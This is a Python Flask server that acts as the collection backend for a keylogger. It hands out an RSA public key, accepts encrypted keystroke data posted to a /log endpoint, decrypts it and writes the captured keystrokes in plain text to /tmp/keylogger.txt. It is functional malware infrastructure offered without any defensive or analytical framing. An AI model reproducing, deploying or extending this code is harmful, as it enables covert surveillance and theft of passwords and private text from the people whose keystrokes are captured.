import os
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
import base64
import datetime

app = Flask(__name__)

# Use very simple paths with guaranteed write access
LOG_FILE = "/tmp/keylogger.txt"
KEY_FILE = "/tmp/private_key.pem"
PUBLIC_KEY_FILE = "/tmp/public_key.pem"

# Create a test log entry immediately on startup
with open(LOG_FILE, "w") as f:
    f.write(f"Server started at {datetime.datetime.now()}\n")
print(f"Created log file at {LOG_FILE}")

# Generate or load keys
if not os.path.exists(KEY_FILE):
    # Generate new key pair
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    
    # Save private key
    with open(KEY_FILE, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))
    
    # Save public key
    public_key = private_key.public_key()
    with open(PUBLIC_KEY_FILE, "wb") as f:
        f.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))
    print("Generated new key pair")
else:
    # Load existing key
    with open(KEY_FILE, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None
        )
    print("Loaded existing key pair")

# Add a test endpoint that always logs something
@app.route('/test', methods=['GET'])
def test_logging():
    with open(LOG_FILE, "a") as log_file:
        log_file.write(f"Test endpoint called at {datetime.datetime.now()}\n")
    return "Test log written"

# Function to decrypt data with private key
def decrypt_data(encrypted_data):
    try:
        encrypted_bytes = base64.b64decode(encrypted_data)
        decrypted_bytes = private_key.decrypt(
            encrypted_bytes,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return decrypted_bytes.decode('utf-8')
    except Exception as e:
        print(f"Decryption error: {e}")
        raise

# API endpoint to receive keystrokes
@app.route('/log', methods=['POST'])
def log_keystroke():
    print("Received POST request to /log")
    
    try:
        # Log the raw request for debugging
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"Received request at {datetime.datetime.now()}\n")
        
        if not request.is_json:
            print("Request is not JSON")
            return jsonify({"error": "Invalid request format"}), 400
        
        data = request.json
        encrypted_keystrokes = data.get('data')
        
        if not encrypted_keystrokes:
            print("No data provided in request")
            return jsonify({"error": "No data provided"}), 400
        
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"Received encrypted data: {encrypted_keystrokes[:20]}...\n")
        
        decrypted_keystrokes = decrypt_data(encrypted_keystrokes)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Save to logfile
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{timestamp}] DECRYPTED: {decrypted_keystrokes}\n")
        
        print(f"Successfully logged keystrokes at {timestamp}")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        error_msg = f"Error in log_keystroke: {str(e)}"
        print(error_msg)
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"ERROR: {error_msg}\n")
        return jsonify({"error": error_msg}), 500

# Endpoint to get the public key
@app.route('/public_key', methods=['GET'])
def get_public_key():
    print("Public key requested")
    with open(PUBLIC_KEY_FILE, "rb") as key_file:
        public_key_pem = key_file.read()
    return public_key_pem

if __name__ == "__main__":
    print(f"Starting server on port 5000, log file at {LOG_FILE}")
    app.run(host='0.0.0.0', port=5000)
